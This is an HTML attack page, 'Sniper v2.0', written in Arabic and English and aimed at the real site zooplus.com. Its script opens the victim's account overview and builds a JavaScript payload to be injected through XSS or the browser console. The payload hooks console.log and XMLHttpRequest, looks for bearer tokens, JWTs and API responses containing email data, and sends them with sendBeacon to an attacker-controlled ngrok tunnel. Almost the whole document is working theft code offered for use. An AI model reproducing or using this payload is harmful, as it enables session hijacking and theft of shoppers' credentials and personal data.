<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام إدارة الجلسات المتقدم</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Segoe UI', monospace; text-align: center; padding-top: 50px; }
        .panel { border: 2px solid #00ff00; display: inline-block; padding: 40px; box-shadow: 0 0 20px #00ff00; border-radius: 15px; }
        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; border-radius: 5px; }
        .status { margin-top: 20px; color: #888; font-size: 14px; }
    </style>
</head>
<body>

    <div class="panel">
        <h1>[+] Sniper v2.0 - Object Interceptor</h1>
        <p>مستهدف: zooplus.com (Sentry/Optimizely Exploitation)</p>
        <p>الوجهة: <span style="color: white;">Ngrok Tunnel Active</span></p>
        <hr color="#00ff00">
        <button onclick="startDeepInfection()">تشغيل وضع الاصطياد العميق</button>
        <div class="status" id="log">بانتظار بدء العملية...</div>
    </div>

    <script>
        const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';

        function startDeepInfection() {
            // 1. فتح نافذة الضحية
            const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');
            document.getElementById('log').innerText = "تم فتح النافذة. جاري مراقبة الكائنات المسربة...";

            // 2. إبلاغ السيرفر ببدء الهجوم
            navigator.sendBeacon(NGROK_URL, JSON.stringify({ event: "DEEP_SCAN_STARTED" }));

            /* ملاحظة للمختبر: الكود أدناه هو ما يجب حقنه (XSS/Console) 
               ليقوم بسحب الكائنات التي رأيتها في الـ Sentry logs
            */
            const payload = `
                (function() {
                    const SERVER = '${NGROK_URL}';
                    
                    // دالة لفحص الكائنات بعمق بحثاً عن التوكين
                    const scanObject = (obj) => {
                        try {
                            const str = JSON.stringify(obj);
                            if (str.includes("Bearer") || str.includes("eyJ")) {
                                navigator.sendBeacon(SERVER, JSON.stringify({
                                    type: "TOKEN_FOUND_IN_OBJECT",
                                    payload: obj,
                                    url: location.href
                                }));
                            }
                        } catch(e) {}
                    };

                    // اعتراض Console.log (لصيد ما يطبعه sentry_6.js)
                    const originalLog = console.log;
                    console.log = function(...args) {
                        args.forEach(arg => {
                            if (typeof arg === 'object') scanObject(arg);
                        });
                        return originalLog.apply(console, args);
                    };

                    // اعتراض الـ Headers الخاصة بـ XMLHttpRequest (لصيد كائن ye)
                    const originalOpen = XMLHttpRequest.prototype.open;
                    XMLHttpRequest.prototype.open = function(m, url) {
                        this.addEventListener('load', function() {
                            if (this.responseText.includes("email")) {
                                navigator.sendBeacon(SERVER, JSON.stringify({
                                    type: "SENSITIVE_API_RESPONSE",
                                    data: this.responseText
                                }));
                            }
                        });
                        return originalOpen.apply(this, arguments);
                    };
                })();
            `;
            console.log("السكريبت جاهز للعمل خلف الكواليس.");
        }
    </script>
</body>
</html>
